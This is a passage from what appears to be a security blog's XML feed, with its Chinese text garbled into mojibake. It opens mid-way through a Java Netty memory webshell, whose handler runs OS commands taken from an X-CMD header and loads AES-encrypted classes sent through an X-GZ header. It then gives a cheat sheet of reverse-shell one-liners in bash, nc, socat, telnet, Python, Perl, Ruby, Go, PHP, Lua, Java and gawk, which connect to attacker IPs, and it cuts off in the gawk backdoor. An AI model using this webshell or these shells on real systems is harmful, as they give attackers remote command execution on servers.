class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5str(pass + xc);</span><br><span class="line">        <span class="keyword">private</span> Class <span class="title function_">defClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>],Thread.currentThread().getContextClassLoader());</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (Class) method.invoke(urlClassLoader,classbytes,<span class="number">0</span>,classbytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">md5str</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.MessageDigest m;</span><br><span class="line">                m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">                ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt;&gt; requestThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>   Class payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> HttpRequest)&#123;</span><br><span class="line">                <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest) msg;</span><br><span class="line">                AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry = <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry(httpRequest,<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>());</span><br><span class="line">                requestThreadLocal.set(simpleEntry);</span><br><span class="line">                <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    cmdList.add(cmd);</span><br><span class="line">                    String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        execResult =execResult+line;</span><br><span class="line">                    &#125;</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (httpRequest.headers().contains(<span class="string">&quot;X-GZ&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">HttpContent</span> <span class="variable">httpContent</span> <span class="operator">=</span> (HttpContent)msg;</span><br><span class="line">                    AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry1 = requestThreadLocal.get();</span><br><span class="line">                    <span class="keyword">if</span> (simpleEntry1 == <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">HttpRequest</span> <span class="variable">httpRequest1</span> <span class="operator">=</span> simpleEntry1.getKey();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">contentBuf</span> <span class="operator">=</span> simpleEntry1.getValue();</span><br><span class="line"></span><br><span class="line">                    <span class="type">ByteBuf</span> <span class="variable">byteBuf</span> <span class="operator">=</span> httpContent.content();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> byteBuf.capacity();</span><br><span class="line">                    <span class="type">byte</span>[] requestContent = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">                    byteBuf.getBytes(<span class="number">0</span>,requestContent,<span class="number">0</span>,requestContent.length);</span><br><span class="line"></span><br><span class="line">                    contentBuf.write(requestContent);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpContent <span class="keyword">instanceof</span> LastHttpContent)&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] data =  x(contentBuf.toByteArray(), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                                payload = defClass(data);</span><br><span class="line">                                gzsend(ctx,x(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                f.equals(arrOut);</span><br><span class="line">                                f.equals(data);</span><br><span class="line">                                f.toString();</span><br><span class="line">                                gzsend(ctx,x(arrOut.toByteArray(), <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                            ctx.fireChannelRead(httpRequest1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ctx.fireChannelRead(msg);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ctx.fireChannelRead(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">gzsend</span><span class="params">(ChannelHandlerContext ctx, <span class="type">byte</span>[] context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ¼æ´åˆ©ç”¨</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>åå¼¹shellæ–¹å¼æ€»ç»“</title>
    <url>/articles/c534ae84/</url>
    <content><![CDATA[<h2 id="åå¼¹shellæ–¹å¼æ€»ç»“"><a href="#åå¼¹shellæ–¹å¼æ€»ç»“" class="headerlink" title="åå¼¹shellæ–¹å¼æ€»ç»“"></a>åå¼¹shellæ–¹å¼æ€»ç»“</h2><h4 id="ncåå¼¹"><a href="#ncåå¼¹" class="headerlink" title="ncåå¼¹"></a><code>ncåå¼¹</code></h4><ul>
<li>åœºæ™¯ä¸€ (<em>æ­£å‘è¿æ¥</em>)</li>
</ul>
<p><strong>viticmä¸»æœº</strong>: ncå¼€å¯æœ¬åœ°ç›‘å¬, å¹¶å°†æœ¬åœ°çš„bashè½¬å‘å‡ºå»</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>attackä¸»æœº</strong>: è¿œç¨‹è¿æ¥ è½¬å‘çš„shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc viticm_ip 9999</span><br></pre></td></tr></table></figure>


<ul>
<li>åœºæ™¯äºŒ(<em>åå‘è¿æ¥</em>)</li>
</ul>
<p><strong>viticmä¸»æœº</strong>: å½“ viticmä¸»æœºç”±äºé˜²ç«å¢™æˆ–è€…å…¶ä»–ä¸€äº›åŸå› , å¯¼è‡´ç«¯å£è®¿é—®è¢«æ‹¦æˆª</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.119.137 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>attackä¸»æœº</strong>: ç›‘å¬æœ¬åœ°ç«¯å£ , è·å–shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure>



<h4 id="bashç›´æ¥åå¼¹"><a href="#bashç›´æ¥åå¼¹" class="headerlink" title="bashç›´æ¥åå¼¹"></a><code>bashç›´æ¥åå¼¹</code></h4><p>bashä¸€å¥è¯shellåå¼¹ï¼šä¸ªäººæ„Ÿè§‰æœ€å¥½ç”¨çš„ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨bashç»“åˆé‡å®šå‘æ–¹æ³•çš„ä¸€å¥è¯ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ã€‚</p>
<ul>
<li>bashåå¼¹ä¸€å¥è¯</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>bashä¸€å¥è¯å‘½ä»¤è¯¦è§£</li>
</ul>
<p>ä»¥ä¸‹é’ˆå¯¹å¸¸ç”¨çš„bashåå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹: </p>
<p><a href="https://p0.ssl.qhimg.com/t01eb18cc78117e5c93.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01eb18cc78117e5c93-1612330896146.png" alt="http://p6.qhimg.com/t013e425e5510c369cc.png"></a></p>
<p>å…¶å®ä»¥ä¸Šbashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼š</p>
<p>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒä¸æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚</p>
<h4 id="socatè½¬å‘"><a href="#socatè½¬å‘" class="headerlink" title="socatè½¬å‘	"></a><code>socatè½¬å‘	</code></h4><p>Socatæ˜¯Linux ä¸‹ä¸€ä¸ªå¤šåŠŸèƒ½çš„ç½‘ç»œå·¥å…·ï¼Œåå­—æ¥ç”±æ˜¯â€ Socket CATâ€ï¼Œå› æ­¤å¯ä»¥çœ‹å‡ºå®ƒåŸºäºsocketï¼Œèƒ½å¤ŸæŠ˜è…¾socketç›¸å…³çš„æ— æ•°äº‹æƒ… ï¼Œå…¶åŠŸèƒ½ä¸netcatç±»ä¼¼ï¼Œä¸è¿‡æ®è¯´å¯ä»¥çœ‹åšnetcatçš„åŠ å¼ºç‰ˆ,äº‹å®ä¸Šçš„ç¡®ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œncåº”æ€¥æ¯”è¾ƒä¹…æ²¡äººç»´æŠ¤äº†ï¼Œç¡®å®æ˜¾å¾—æœ‰äº›é™ˆæ—§äº†ï¼Œæˆ‘è¿™é‡Œåªç®€å•çš„ä»‹ç»ä¸‹æ€ä¹ˆä½¿ç”¨å®ƒå¼€å¯ç›‘å¬å’Œåå¼¹shellï¼Œå…¶ä»–è¯¦ç»†å†…å®¹å¯ä»¥å‚åŠ è§æ–‡æœ«çš„å‚è€ƒå­¦ä¹ ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat     </span><br><span class="line">chmod 755 /tmp/socat</span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>

<p>socatä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
<ul>
<li>attackæœºå™¨ä¸Šå¼€å¯ç›‘å¬</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>

<ul>
<li>viticmæœºå™¨åå¼¹shell</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>

<h4 id="tlnetè½¬å‘"><a href="#tlnetè½¬å‘" class="headerlink" title="tlnetè½¬å‘"></a><code>tlnetè½¬å‘</code></h4><ul>
<li>viticmæœºå™¨æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mknod a p; telnet 192.168.119.137 4444 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>

<ul>
<li>attackæœºå™¨ç›‘å¬ç«¯å£</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä»¥ä¸Šåå¼¹shellæ—¶, å¯èƒ½å‡ºç° æ— å‘½ä»¤å¤´, æ— æ³•è¡¥å…¨çš„é—®é¢˜</p>
<p>ä½¿ç”¨pythonçš„ptyåº“è¿›è¡Œè§£å†³</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line">$ <span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">//$ <span class="built_in">export</span> TERM=xterm-256color</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="åˆ©ç”¨ç¼–ç¨‹è¯­è¨€åå¼¹shell"><a href="#åˆ©ç”¨ç¼–ç¨‹è¯­è¨€åå¼¹shell" class="headerlink" title="åˆ©ç”¨ç¼–ç¨‹è¯­è¨€åå¼¹shell"></a>åˆ©ç”¨ç¼–ç¨‹è¯­è¨€åå¼¹shell</h3><h4 id="1-pyåå¼¹shell"><a href="#1-pyåå¼¹shell" class="headerlink" title="1. pyåå¼¹shell"></a><code>1. pyåå¼¹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‹†æˆå¤šè¡Œæ–¹ä¾¿é˜…è¯»</span></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;ip&#x27;</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="2-perlåå¼¹shell"><a href="#2-perlåå¼¹shell" class="headerlink" title="2. perlåå¼¹shell"></a><code>2. perlåå¼¹shell</code></h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=â€10.211.55.2&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹†æˆå¤šè¡Œæ–¹ä¾¿é˜…è¯»</span></span><br><span class="line"><span class="keyword">use</span> Socket</span><br><span class="line"><span class="variable">$i</span>=â€<span class="number">10.211</span><span class="number">.55</span>.<span class="number">2</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="variable">$p</span>=7777</span></span><br><span class="line"><span class="string">socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;</span>tcp<span class="string">&quot;))</span></span><br><span class="line"><span class="string">if(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;</span></span><br><span class="line"><span class="string">    open(STDIN,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDOUT,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDERR,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    exec(&quot;</span>/bin/sh -i<span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-rubyåå¼¹shell"><a href="#3-rubyåå¼¹shell" class="headerlink" title="3. rubyåå¼¹shell"></a>3. <code>rubyåå¼¹shell</code></h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)â€™</span></span><br></pre></td></tr></table></figure>

<h4 id="4-goåå¼¹shell"><a href="#4-goåå¼¹shell" class="headerlink" title="4. goåå¼¹shell"></a>4. <code>goåå¼¹shell</code></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;192.168.0.134:8080&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span> &amp;&amp; <span class="keyword">go</span> run /tmp/t.<span class="keyword">go</span> &amp;&amp; rm /tmp/t.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h4 id="5-phpåå¼¹shell"><a href="#5-phpåå¼¹shell" class="headerlink" title="5. phpåå¼¹shell"></a>5. <code>phpåå¼¹shell</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php â€“r  <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777&quot;)â€™</span></span><br></pre></td></tr></table></figure>

<h4 id="6-luaåå¼¹shell"><a href="#6-luaåå¼¹shell" class="headerlink" title="6. luaåå¼¹shell"></a>6. <code>luaåå¼¹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>

<h4 id="7-java"><a href="#7-java" class="headerlink" title="7. java"></a><code>7. java</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h4 id="8-gawk"><a href="#8-gawk" class="headerlink" title="8. gawk"></a><code>8. gawk</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/gawk -f</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">        Port    =       8080</span><br><span class="line">        Prompt  =       &quot;bkd&gt; &quot;</span><br><span class="line"></span><br><span class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</span><br><span class="line">        while (1) &#123;</span><br><span class="line">                do &#123;</span><br><span class="line">                        printf Prompt |&amp; Service</span><br><span class="line">                        Service |&amp; getline cmd</span><br><span class="line">                        if (cmd) &#123;</span><br><span class="line">                                while ((cmd |&amp; getline) &gt; 0)</span><br><span class="line">                                        print $0 |&amp; Service</span><br><span class="line">                                close(cmd)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; while (cmd != &quot;exit&quot;)</span><br><span class="line">                close(Service)</span><br><span class="line">        &#125;</span><br><span 